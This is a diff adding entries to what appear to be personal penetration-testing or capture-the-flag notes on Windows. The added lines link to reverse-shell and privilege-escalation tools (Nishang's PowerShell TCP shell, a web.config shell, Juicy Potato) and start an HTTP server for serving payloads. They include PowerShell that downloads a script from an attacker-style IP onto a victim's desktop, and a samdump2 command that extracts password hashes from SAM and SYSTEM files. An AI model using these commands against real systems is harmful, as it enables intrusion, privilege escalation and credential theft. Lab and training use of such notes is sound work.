@@ -3,6 +3,26 @@ ssh -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa,
 
 ```
 
+```
+ps rs asp iis
+python3 -m http.server 8080
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/web.config
+https://github.com/ohpe/juicy-potato/releases/tag/v0.1
+https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1
+
+    $client = New-Object System.Net.WebClient
+    $url = 'http://10.10.14.60:8000/clsid.ps1'
+    $file = 'C:\Users\merlin\Desktop\clsid.ps1'
+    $client.DownloadFile($url, $file)
+```
+
+```
+SAM Files
+windows\system32\config\ SAM SYSTEM
+samdump2 SYSTEM SAM > fd
+```
+
 # Windows
 
 ## Recon enumeration
